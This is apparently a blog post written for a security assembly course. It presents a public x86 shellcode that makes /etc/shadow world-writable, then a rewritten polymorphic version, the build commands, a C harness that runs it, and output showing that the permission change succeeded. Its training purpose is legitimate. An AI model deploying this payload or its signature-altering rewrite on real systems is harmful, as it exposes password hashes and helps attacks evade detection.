---
layout: single
title: SLAE Assignment 6 -- Polymorphic Shellcode
date: 2019-5-13
classes: wide
header:
  teaser: /assets/images/SLAE/SLAE.jpg
tags:
  - SLAE
  - Linux
  - x86
  - shellcoding
  - MSF
  - polymorphic
--- 
![](/assets/images/SLAE/SLAE.jpg)

## Introduction

Assignment 6 is to create polymorphic versions of three separate shellcodes from [shell-storm](http://shell-storm.org/shellcode/). According to the [Polymorphic code](https://en.wikipedia.org/wiki/Polymorphic_code) Wikipedia entry, polymorphic code is "code that uses a polymorphic engine to mutate while keeping the original algorithm intact. That is, the code changes itself each time it runs, but the function of the code (its semantics) will not change at all. For example, 1+3 and 6-2 both achieve the same result while using different values and operations." However, the polymorphic engine in this case will be us manually changing the shellcode. 

Our goal is to not increase the size of the shellcode by more than 50%.

The format of these posts will be me posting the assembly of the original shellcode, along with its author and a link, and then posting my polymorphic version below with major changes commented. Let's begin!

## Shellcode 1

`chmod(/etc/shadow, 0666) & exit()` by ka0x, located [here](http://shell-storm.org/shellcode/files/shellcode-556.php)

Size: 33 Bytes

```c
#include <stdio.h>
 
/*
    linux/x86 ; chmod(/etc/shadow, 0666) & exit() 33 bytes
    written by ka0x - <ka0x01[alt+64]gmail.com>
    lun sep 21 17:13:25 CEST 2009
 
    greets: an0de, Piker, xarnuz, NullWave07, Pepelux, JosS, sch3m4, Trancek and others!
 
*/
 
int main()
{
 
    char shellcode[] =
            "\x31\xc0"          // xor eax,eax
            "\x50"              // push eax
            "\x68\x61\x64\x6f\x77"      // push dword 0x776f6461
            "\x68\x2f\x2f\x73\x68"      // push dword 0x68732f2f
            "\x68\x2f\x65\x74\x63"      // push dword 0x6374652f
            "\x89\xe3"          // mov ebx,esp
            "\x66\x68\xb6\x01"      // push word 0x1b6
            "\x59"              // pop ecx
            "\xb0\x0f"          // mov al,0xf
            "\xcd\x80"          // int 0x80
            "\xb0\x01"          // mov al,0x1
            "\xcd\x80";         // int 0x80
 
    printf("[*] ShellCode size (bytes): %d\n\n", sizeof(shellcode)-1 );
    (*(void(*)()) shellcode)();
     
    return 0;
}
```

We're going to be working with the assembly comments he provided in his C code. There isn't much room for us to work with here, so we'll most likely be adding junk operations and increasing the size a bit.

```nasm
global _start


section .text

_start:

	xor ecx, ecx		  ; clearing a different register at the start
	mul ecx			  ; this clears both EAX and EDX
	push edx		  ; finally get back around to pushing our null onto the stack but with a 2nd new register
	push dword 0x776f6461     ; this section is the same, but wanted to explain:
	push dword 0x68732f2f     ; we're just pushing '/etc/shadow' onto the stack here 
	push dword 0x6374652f
	mov edi,esp		  ; save stack pointer in different register
	xchg ebx, edi		  ; put stack pointer back into EBX
	push word 0x1ff		  ; push '777' instead of '666' (this is in octal)
	pop ecx
	sub ecx, 0x49		  ; get ECX back down to '666' by subtracting '111'
	mov al,0xf
	int 0x80
	mov al,0x1
	int 0x80
```

Assemble and link our code:
```terminal_session
root@kali:~# nasm -f elf32 chmod.nasm && ld -m elf_i386 chmod.o -o chmod_test
```

Dump the shellcode:
```terminal_session
root@kali:~# objdump -d ./chmod_test|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc9\xf7\xe1\x52\x68\x61\x64\x6f\x77\x68\x2f\x2f\x73\x68\x68\x2f\x65\x74\x63\x89\xe7\x87\xdf\x66\x68\xff\x01\x59\x83\xe9\x49\xb0\x0f\xcd\x80\xb0\x01\xcd\x80"
```

Place it into our shellcode.c file:
```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc9\xf7\xe1\x52\x68\x61\x64\x6f\x77\x68\x2f\x2f\x73\x68\x68\x2f\x65\x74\x63\x89\xe7\x87\xdf\x66\x68\xff\x01\x59\x83\xe9\x49\xb0\x0f\xcd\x80\xb0\x01\xcd\x80";


main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
```

Finally, compile and run!
```terminal_session
root@kali:~# gcc -fno-stack-protector -z execstack -m32 shellcode.c -o chmod_test
```
```terminal_session
root@kali:/etc# cp ~/chmod_test .
root@kali:/etc# ./chmod_test
Shellcode Length:  40
root@kali:/etc# ls -lah | grep shadow
-rw-rw-rw-   1 root    shadow  1.8K Jan 21 00:36 shadow
```

The shadow file has `666` permissions, our code was a success! 

Size increase: 21%



## Github

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
<http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/>

Student ID: SLAE-1458

You can find all of the code used in this blog post [here.](https://github.com/h0mbre/SLAE/tree/master/Assignment5)



